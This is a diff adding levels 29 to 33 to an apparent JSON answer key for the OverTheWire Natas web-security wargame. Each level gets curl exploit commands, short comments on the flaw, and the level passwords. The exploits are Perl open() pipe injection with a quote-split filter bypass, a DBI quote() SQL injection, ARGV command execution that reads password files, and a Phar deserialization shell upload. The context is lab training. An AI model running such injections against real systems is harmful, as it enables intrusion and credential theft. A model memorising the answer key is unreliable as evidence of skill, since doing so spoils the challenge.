@@ -439,6 +439,89 @@
     "(one of the 'jokes' listed is the password row)"
    ],
    "pw": "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah"
+  },
+  {
+   "lvl": 29,
+   "user": "natas29",
+   "cmds": [
+    [
+     "# index.pl feeds 'file' to a Perl two-arg open \u2014 a leading | makes it a shell pipeline",
+     "# but any parameter containing the word natas is silently dropped, so split it with quotes:",
+     "curl -s -u natas29:PASS --get --data-urlencode 'file=| cat \"/etc/nata\"\"s_webpa\"\"ss/nata\"\"s30\" | tr '\\n' ' '' http://natas29.natas.labs.overthewire.org/index.pl"
+    ]
+   ],
+   "out": [
+    "(the password file's contents, printed as the 'poem')"
+   ],
+   "pw": "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF"
+  },
+  {
+   "lvl": 30,
+   "user": "natas30",
+   "cmds": [
+    [
+     "# the Perl login builds SQL with $dbh->quote(param('password'))",
+     "# send the parameter TWICE: quote() then gets (value, type) and a numeric type means 'return unquoted':",
+     "curl -s -u natas30:PASS -X POST http://natas30.natas.labs.overthewire.org/index.pl --data-urlencode 'username=natas31' --data-urlencode \"password='' or 1\" --data-urlencode 'password=2'"
+    ]
+   ],
+   "out": [
+    "win! here is your result: natas31<password>"
+   ],
+   "pw": "aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z"
+  },
+  {
+   "lvl": 31,
+   "user": "natas31",
+   "cmds": [
+    [
+     "# index.pl: if upload('file') passes, it does  $file = param('file');  while (<$file>) { print rows }",
+     "# param() returns the FIRST 'file' value; upload() only needs SOME part to be a real upload.",
+     "# Send a plain field first (value: ARGV), then the real CSV \u2014 and put a command in the URL:",
+     "curl -s -u natas31:PASS -F 'file=ARGV' -F 'file=@tiny.csv;type=text/csv' 'http://natas31.natas.labs.overthewire.org/index.pl?/bin/cat%20/etc/natas_webpass/natas32%20|'",
+     "# <$file> is now <ARGV>: the diamond operator open()s the query-string 'filename' \u2014 trailing | makes it a command"
+    ]
+   ],
+   "out": [
+    "(the command's output, rendered as table cells)"
+   ],
+   "pw": "Rc3837d6qd3KoW0R2IgKssMXRX06btgY"
+  },
+  {
+   "lvl": 32,
+   "user": "natas32",
+   "cmds": [
+    [
+     "# identical viewer code to natas31 \u2014 same ARGV + diamond-operator trick\u2026",
+     "curl -s -u natas32:PASS -F 'file=ARGV' -F 'file=@tiny.csv;type=text/csv' 'http://natas32.natas.labs.overthewire.org/index.pl?ls%20-la%20|'",
+     "# \u2026but the password file itself is not readable by the web user this time.",
+     "# the webroot ships a helper binary for exactly that \u2014 execute it instead:",
+     "curl -s -u natas32:PASS -F 'file=ARGV' -F 'file=@tiny.csv;type=text/csv' 'http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|'"
+    ]
+   ],
+   "out": [
+    "(the helper prints the natas33 password)"
+   ],
+   "pw": "kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL"
+  },
+  {
+   "lvl": 33,
+   "user": "natas33",
+   "cmds": [
+    [
+     "# Executor::__destruct runs 'php <filename>' when md5_file(filename) == signature",
+     "# 1) upload a shell and note its real md5; 2) upload a tiny Phar whose METADATA is a forged",
+     "#    Executor(filename='shell.php', signature=<that md5>); 3) submit any upload with:",
+     "curl -s -u natas33:PASS -F 'filename=shell.php' -F 'uploadedfile=@shell.php' http://natas33.natas.labs.overthewire.org/index.php",
+     "curl -s -u natas33:PASS -F 'filename=evil.phar' -F 'uploadedfile=@evil.phar' http://natas33.natas.labs.overthewire.org/index.php",
+     "curl -s -u natas33:PASS -F 'filename=phar:///natas33/upload/evil.phar/x.txt' -F 'uploadedfile=@tiny.csv' http://natas33.natas.labs.overthewire.org/index.php",
+     "# md5_file() on the phar:// path unserializes the metadata \u2014 the forged Executor's destructor runs the shell"
+    ]
+   ],
+   "out": [
+    "Congratulations! Running firmware update: shell.php"
+   ],
+   "pw": "cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK"
   }
  ],
  "goals": {
@@ -470,6 +553,11 @@
   "25": "A 'safe' include strips ../ and bans the password path by name \u2014 but it logs your User-Agent to an includable file, and the strip itself can be folded back into a traversal.",
   "26": "A drawing cookie is unserialized without checks \u2014 inject a crafted object whose destructor writes a file of your choosing.",
   "27": "Registration truncates names to 64 characters while the data dump trims them \u2014 a padded lookalike account makes the dump hand you the real user's row.",
-  "28": "The query is escaped and then ECB-encrypted into the backend SQL \u2014 cut ciphertext blocks from a donor query and splice in an unescaped UNION SELECT."
+  "28": "The query is escaped and then ECB-encrypted into the backend SQL \u2014 cut ciphertext blocks from a donor query and splice in an unescaped UNION SELECT.",
+  "29": "A Perl open() treats the chosen 'file' as a shell pipeline \u2014 and the one word the filter bans can be smuggled past it inside shell quotes.",
+  "30": "The login quotes parameters 'safely' \u2014 unless a parameter arrives twice, which silently switches quote() into its unquoted numeric mode.",
+  "31": "A CSV viewer reads lines from a user-named handle \u2014 name it ARGV and the 'file' it iterates is your URL, pipe and all.",
+  "32": "Same ARGV flaw, one twist: the flag file is unreadable, so run the privileged helper binary the level provides instead of reading the file.",
+  "33": "A firmware uploader executes any file whose MD5 matches a stored signature \u2014 and a Phar archive lets you forge the object that carries both."
  }
 }
